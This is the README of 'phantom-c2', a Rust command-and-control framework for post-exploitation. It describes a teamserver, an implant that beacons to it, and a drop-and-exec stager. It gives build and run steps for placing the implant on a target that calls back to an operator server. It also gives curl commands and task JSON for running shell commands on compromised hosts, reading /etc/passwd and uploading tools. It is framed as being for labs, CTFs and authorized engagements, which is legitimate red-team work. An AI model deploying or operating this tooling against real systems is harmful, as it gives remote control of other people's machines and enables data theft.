# phantom-c2

> "I will become the god of a new world."  
> — Light Yagami, approximately three bad decisions before everything went wrong.

A lightweight C2 framework written in Rust. Built because `grimoire sovereign` (my previous reverse shell handler) was embarrassingly fragile — raw TCP + readline is not a C2.

**Lab / CTF / authorized engagements only.** If you use this against systems you don't own, that's on you.

---

## architecture

```
operator (CLI / REST API / WebSocket)
         ↕
   phantom teamserver
    ├── TLS implant listener  :4444
    ├── REST + WS API         :8443
    ├── session store (DashMap)
    └── per-session task queues (FIFO)
         ↕  mTLS
      implant (Rust, static musl)
       ├── beacon loop (sleep + jitter)
       ├── shell execution
       ├── file I/O (base64)
       └── ls / sleep / die tasks
```

---

## quick start

### 1. generate certs

```bash
chmod +x gen_certs.sh
./gen_certs.sh 127.0.0.1
```

### 2. build

```bash
# server
cargo build --release -p phantom-server

# implant (static linux binary)
rustup target add x86_64-unknown-linux-musl
cargo build --release -p phantom-implant --target x86_64-unknown-linux-musl
```

### 3. run the server

```bash
./target/release/phantom --bind 0.0.0.0:4444 --api-bind 127.0.0.1:8443 -v
```

### 4. run the implant (on target)

```bash
PHANTOM_SERVER=yourserver:4444 ./implant
```

### 5. interact via REST API

```bash
# list sessions
curl http://127.0.0.1:8443/sessions

# queue a shell command
curl -X POST http://127.0.0.1:8443/sessions/<id>/task \
  -H 'Content-Type: application/json' \
  -d '{"type":"shell","cmd":"id"}'

# get results
curl http://127.0.0.1:8443/sessions/<id>/results
```

---

## implant config (env vars)

| var | default | meaning |
|-----|---------|---------|
| `PHANTOM_SERVER` | `127.0.0.1:4444` | teamserver address |
| `PHANTOM_CA` | (none) | path to CA cert for TLS verification |
| `PHANTOM_SLEEP_MS` | `5000` | beacon interval in milliseconds |
| `PHANTOM_JITTER` | `20` | jitter % on sleep interval |
| `PHANTOM_RETRY` | `30` | seconds to wait before reconnect |

---

## task types

```json
{ "type": "shell",    "cmd": "whoami" }
{ "type": "ls",       "path": "/etc" }
{ "type": "download", "path": "/etc/passwd" }
{ "type": "upload",   "path": "/tmp/tool", "data_b64": "<base64>" }
{ "type": "sleep",    "ms": 10000, "jitter_pct": 30 }
{ "type": "die" }
```

---

## project structure

```
phantom-c2/
├── server/
│   └── src/
│       ├── main.rs       entry point, startup
│       ├── cli.rs        argument definitions
│       ├── banner.rs     the thing everyone skips
│       ├── error.rs      error types
│       ├── listener.rs   TLS implant listener
│       ├── session.rs    session registry
│       ├── task.rs       task queues + result store
│       └── api.rs        REST + WebSocket operator API
├── implant/
│   └── src/
│       ├── main.rs       beacon loop
│       ├── exec.rs       shell, ls, file I/O
│       ├── sysinfo.rs    host info for BeaconHello
│       └── config.rs     env var config
├── stager/
│   └── stager.py         python drop + exec stager
├── certs/                (generated, gitignored)
├── gen_certs.sh          self-signed cert helper
└── Cargo.toml            workspace
```

---

## known gaps / TODO

- [ ] mTLS implant verification (CA cert verifier in listener.rs)
- [ ] operator CLI (`phantom shell`) as a proper TUI (ratatui)
- [ ] HTTP/S beacon transport as fallback (currently TCP only)
- [ ] implant auto-compile + stager generation via API
- [ ] operator auth token on the REST API
- [ ] WebSocket push on new session checkin
- [ ] proactive task push (currently poll-only)

---

## part of the ecosystem

| tool | role |
|------|------|
| [LightScan](../lightscan-phantom) | port scan + banner grab during recon |
| [wraith-net](../wraith-net) | passive recon, subdomain + email intel |
| [grimoire](../grimoire) | operator toolkit (this replaces sovereign module) |
| phantom-c2 | active C2 for authorized post-exploitation |

---

*Light / Neok1ra — neok1ra@proton.me — [PGP](https://keys.openpgp.org)*
